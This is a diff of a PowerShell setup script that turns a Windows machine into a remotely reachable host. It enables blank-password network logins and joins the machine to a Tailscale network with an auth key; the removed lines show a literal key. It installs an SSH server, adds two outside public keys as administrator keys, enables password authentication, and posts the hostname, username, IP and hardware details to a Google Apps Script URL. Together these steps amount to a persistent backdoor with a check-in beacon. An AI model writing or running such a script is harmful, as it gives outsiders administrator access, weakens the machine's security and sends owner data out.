@@ -1,84 +1,281 @@
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
+# =========================================================
+# REQUIRE ADMIN RIGHTS
+# =========================================================
 
-winget install --id Tailscale.Tailscale -e
+$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
 
-tailscale up --authkey=tskey-auth-k7M4zrRzZ911CNTRL-nPuWFmmhy7bAKLtdczb87b8bVHAMV1dQ7
-
-sc.exe config Tailscale start= auto
-
-sc.exe failure Tailscale reset= 0 actions= restart/5000
-
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-
-Start-Service sshd
-
-Set-Service -Name sshd -StartupType Automatic
-
-New-Item -ItemType Directory -Force C:\ProgramData\ssh
-
-Add-Content C:\ProgramData\ssh\administrators_authorized_keys "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJKINXvdC+IzYUgWUz6qa/UBC8cCoIFAPVf3VIQf6XX celestial@ubantu-server"
-
-Add-Content "C:\ProgramData\ssh\administrators_authorized_keys" 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMV1/doA3c5//3PlZ/z3hk/ts8b8gHZoLkAMd4r2s8Sw hp@DESKTOP-EliteBook'
-
-icacls "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r
-
-icacls "C:\ProgramData\ssh\administrators_authorized_keys" /grant "Administrators:F"
-
-icacls "C:\ProgramData\ssh\administrators_authorized_keys" /grant "SYSTEM:F"
-
-$config = "C:\ProgramData\ssh\sshd_config"
-
-$content = Get-Content $config -Raw
-
-if ($content -match '(?mi)^\s*#?\s*PubkeyAuthentication\s+') {
-    $content = $content -replace '(?mi)^\s*#?\s*PubkeyAuthentication\s+.*$', 'PubkeyAuthentication yes'
-} else {
-    $content += "`r`nPubkeyAuthentication yes"
+if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "Please run this script as Administrator." -ForegroundColor Red
+    exit 1
 }
-if ($content -match '(?mi)^\s*#?\s*PasswordAuthentication\s+') {
-    $content = $content -replace '(?mi)^\s*#?\s*PasswordAuthentication\s+.*$', 'PasswordAuthentication yes'
-} else {
-    $content += "`r`nPasswordAuthentication yes"
+
+# =========================================================
+# SETTINGS
+# =========================================================
+
+$TAILSCALE_AUTHKEY = "YOUR_TAILSCALE_AUTHKEY"
+
+$PUBLIC_KEYS = @(
+    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJKINXvdC+IzYUgWUz6qa/UBC8cCoIFAPVf3VIQf6XX celestial@ubantu-server',
+    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMV1/doA3c5//3PlZ/z3hk/ts8b8gHZoLkAMd4r2s8Sw hp@DESKTOP-EliteBook'
+)
+
+$REPORT_URL = "https://script.google.com/macros/s/AKfycbxgICZt5BO7bioRfM64L51izipqX15oDbeQF2EddZ7aAldoWxoHEBOUp0D1UowXNiuQTA/exec"
+
+# =========================================================
+# ENABLE BLANK PASSWORD NETWORK LOGIN
+# =========================================================
+
+try {
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f | Out-Null
+    Write-Host "Registry updated." -ForegroundColor Green
 }
-if ($content -notmatch '(?mi)administrators_authorized_keys') {
-    $content += @"
+catch {
+    Write-Host "Failed to update registry: $_" -ForegroundColor Yellow
+}
+
+# =========================================================
+# INSTALL TAILSCALE
+# =========================================================
+
+function Install-Tailscale {
+
+    if (Get-Command tailscale -ErrorAction SilentlyContinue) {
+        Write-Host "Tailscale already installed." -ForegroundColor Cyan
+        return
+    }
+
+    if (Get-Command winget -ErrorAction SilentlyContinue) {
+
+        Write-Host "Installing Tailscale using winget..." -ForegroundColor Cyan
+
+        winget install --id Tailscale.Tailscale -e --accept-source-agreements --accept-package-agreements
+    }
+    else {
+
+        Write-Host "winget not found. Downloading installer directly..." -ForegroundColor Yellow
+
+        $installer = "$env:TEMP\tailscale-setup.exe"
+
+        Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile $installer
+
+        Start-Process $installer -ArgumentList "/S" -Wait
+    }
+}
+
+Install-Tailscale
+
+# =========================================================
+# WAIT FOR SERVICE
+# =========================================================
+
+Start-Sleep -Seconds 10
+
+# =========================================================
+# CONFIGURE TAILSCALE SERVICE
+# =========================================================
+
+if (Get-Service Tailscale -ErrorAction SilentlyContinue) {
+
+    try {
+        Set-Service Tailscale -StartupType Automatic
+    }
+    catch {}
+
+    try {
+        sc.exe failure Tailscale reset= 0 actions= restart/5000 | Out-Null
+    }
+    catch {}
+
+    try {
+        Start-Service Tailscale
+    }
+    catch {}
+
+    Start-Sleep -Seconds 5
+
+    try {
+        tailscale up --authkey=$TAILSCALE_AUTHKEY
+    }
+    catch {
+        Write-Host "tailscale up failed: $_" -ForegroundColor Yellow
+    }
+}
+else {
+    Write-Host "Tailscale service not found." -ForegroundColor Yellow
+}
+
+# =========================================================
+# INSTALL OPENSSH SERVER
+# =========================================================
+
+$sshdService = Get-Service sshd -ErrorAction SilentlyContinue
+
+if (-not $sshdService) {
+
+    Write-Host "Installing OpenSSH Server..." -ForegroundColor Cyan
+
+    try {
+        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    }
+    catch {
+        Write-Host "OpenSSH installation failed: $_" -ForegroundColor Red
+    }
+}
+
+# =========================================================
+# START SSHD
+# =========================================================
+
+$sshdService = Get-Service sshd -ErrorAction SilentlyContinue
+
+if ($sshdService) {
+
+    try {
+        Set-Service sshd -StartupType Automatic
+    }
+    catch {}
+
+    try {
+        Start-Service sshd
+    }
+    catch {}
+}
+else {
+    Write-Host "sshd service not found." -ForegroundColor Red
+}
+
+# =========================================================
+# CREATE SSH DIRECTORY
+# =========================================================
+
+$sshDir = "C:\ProgramData\ssh"
+$authKeys = "$sshDir\administrators_authorized_keys"
+$config = "$sshDir\sshd_config"
+
+New-Item -ItemType Directory -Path $sshDir -Force | Out-Null
+
+if (-not (Test-Path $authKeys)) {
+    New-Item -ItemType File -Path $authKeys -Force | Out-Null
+}
+
+# =========================================================
+# ADD PUBLIC KEYS
+# =========================================================
+
+$currentKeys = Get-Content $authKeys -ErrorAction SilentlyContinue
+
+foreach ($key in $PUBLIC_KEYS) {
+
+    if ($currentKeys -notcontains $key) {
+        Add-Content $authKeys $key
+    }
+}
+
+# =========================================================
+# FIX PERMISSIONS
+# =========================================================
+
+try {
+    icacls $authKeys /inheritance:r | Out-Null
+    icacls $authKeys /grant "Administrators:F" | Out-Null
+    icacls $authKeys /grant "SYSTEM:F" | Out-Null
+}
+catch {
+    Write-Host "Failed setting ACLs: $_" -ForegroundColor Yellow
+}
+
+# =========================================================
+# CONFIGURE SSHD CONFIG
+# =========================================================
+
+if (Test-Path $config) {
+
+    $content = Get-Content $config -Raw
+
+    if ($content -match '(?mi)^\s*#?\s*PubkeyAuthentication\s+') {
+        $content = $content -replace '(?mi)^\s*#?\s*PubkeyAuthentication\s+.*$', 'PubkeyAuthentication yes'
+    }
+    else {
+        $content += "`r`nPubkeyAuthentication yes"
+    }
+
+    if ($content -match '(?mi)^\s*#?\s*PasswordAuthentication\s+') {
+        $content = $content -replace '(?mi)^\s*#?\s*PasswordAuthentication\s+.*$', 'PasswordAuthentication yes'
+    }
+    else {
+        $content += "`r`nPasswordAuthentication yes"
+    }
+
+    if ($content -notmatch '(?mi)administrators_authorized_keys') {
+
+        $content += @"
 
 Match Group administrators
        AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
 "@
+    }
+
+    Set-Content -Path $config -Value $content -Encoding ascii
+}
+else {
+    Write-Host "sshd_config not found." -ForegroundColor Yellow
 }
 
-Set-Content $config $content
+# =========================================================
+# RESTART SSHD
+# =========================================================
 
-Restart-Service sshd
+try {
+    Restart-Service sshd
+}
+catch {
+    Write-Host "Failed restarting sshd." -ForegroundColor Yellow
+}
 
-$URL = "https://script.google.com/macros/s/AKfycbxgICZt5BO7bioRfM64L51izipqX15oDbeQF2EddZ7aAldoWxoHEBOUp0D1UowXNiuQTA/exec"
+# =========================================================
+# COLLECT SYSTEM INFO
+# =========================================================
 
-$body = @{
-    host           = $env:COMPUTERNAME
-    tailscale_ip   = (tailscale ip -4)
-    username       = $env:USERNAME
-    os             = (Get-CimInstance Win32_OperatingSystem).Caption
+try {
 
-    ram   = [math]::Round(
-                        (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB,
-                        2
-                     )
+    $tailscaleIP = "Unavailable"
 
-    storage = [math]::Round(
-                          (
-                            (Get-CimInstance Win32_LogicalDisk |
-                             Where-Object { $_.DriveType -eq 3 } |
-                             Measure-Object -Property Size -Sum
-                            ).Sum
-                          ) / 1GB,
-                          2
-                       )
+    if (Get-Command tailscale -ErrorAction SilentlyContinue) {
+        try {
+            $tailscaleIP = (tailscale ip -4 | Select-Object -First 1)
+        }
+        catch {}
+    }
 
-} | ConvertTo-Json
+    $storage = (
+        Get-CimInstance Win32_LogicalDisk |
+        Where-Object { $_.DriveType -eq 3 } |
+        Measure-Object -Property Size -Sum
+    ).Sum
 
-Invoke-RestMethod `
-    -Uri $URL `
-    -Method POST `
-    -ContentType "application/json" `
-    -Body $body
+    $body = @{
+        host         = $env:COMPUTERNAME
+        username     = $env:USERNAME
+        tailscale_ip = $tailscaleIP
+        os           = (Get-CimInstance Win32_OperatingSystem).Caption
+        ram          = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+        storage      = [math]::Round($storage / 1GB, 2)
+    } | ConvertTo-Json
+
+    Invoke-RestMethod `
+        -Uri $REPORT_URL `
+        -Method POST `
+        -ContentType "application/json" `
+        -Body $body
+
+    Write-Host "System info uploaded." -ForegroundColor Green
+}
+catch {
+    Write-Host "Failed uploading system info: $_" -ForegroundColor Yellow
+}
+
+# =========================================================
+# FINISHED
+# =========================================================
